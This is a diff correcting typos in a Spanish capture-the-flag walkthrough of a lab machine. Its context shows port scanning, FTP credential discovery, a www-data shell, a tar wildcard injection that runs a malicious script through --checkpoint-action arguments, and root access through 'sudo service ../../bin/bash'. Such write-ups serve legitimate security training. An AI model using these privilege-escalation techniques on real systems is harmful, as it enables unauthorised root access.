@@ -23,7 +23,7 @@ Contenido:
 
 ### _Walktrought_:
 
-Una vez tengamos acceso a la máquina y sepamos su dirección IP, escanearemos todos los servicios que tenga disponibles.
+Una vez tengamos acceso a la máquina y sepamos su dirección IP, escaneamos todos los servicios que tenga disponibles.
 
 ```sh
 ┌──(root💀kali)-[/home/kali]
@@ -121,7 +121,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
 ```
 
-Una vez abierto, entramos gracias al login anónimo, y en un archivo _.txt_ encontraremos un texto con unas credecianles.
+Una vez abierto, entramos gracias al login anónimo, y en un archivo _.txt_ encontraremos un texto con unas credenciales.
 
 ```sh
 ┌──(root💀kali)-[/home/kali]
@@ -302,9 +302,9 @@ bash: no job control in this shell
 www-data@waynemanor:~/html/batflat/admin$
 ```
 
-Ahora con una shell como el usuario _www-data_ inciaremos la escalada de privilegios.
+Ahora con una shell como el usuario _www-data_ iniciaremos la escalada de privilegios.
 
-A continuación nos descargaremos el binario de _pspy_ (herramienta para la monitorización de procesos) y lo pondremos en escucha en el equipo para ver en tiempo real qué procesos se están ejecutando.
+A continuación nos descargamos el binario de _pspy_ (herramienta para la monitorización de procesos) y lo pondremos en escucha en el equipo para ver en tiempo real qué procesos se están ejecutando.
 
 ```sh
 www-data@waynemanor:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
@@ -382,7 +382,7 @@ Este es el script original:
 tar -zcf /tmp/web.tar.gz *
 ```
 
-Y gracias al _wildcard_ (*) le añadiremos dos argumentos que nos ejecutaran un binario malicioso:
+Y gracias al _wildcard_ (asterisco) le añadiremos dos argumentos que nos ejecutarán un binario malicioso:
 
 ```sh
 tar -zcf /tmp/web.tar.gz --checkpoint=1 --checkpoint-action=exec=python3 privesc.py
@@ -481,7 +481,7 @@ batman@waynemanor:/var/www/html$
 
 Finalmente, el archivo _/etc/sudoers_ nos indica que podemos ejecutar _/usr/sbin/service_ como el usuario root (más información [aquí](https://gtfobins.github.io/gtfobins/service/#sudo).
 
-Abusaremos de esta configuracion con el comando:
+Abusaremos de esta configuración con el comando:
 
 ```sh
 sudo service ../../bin/bash
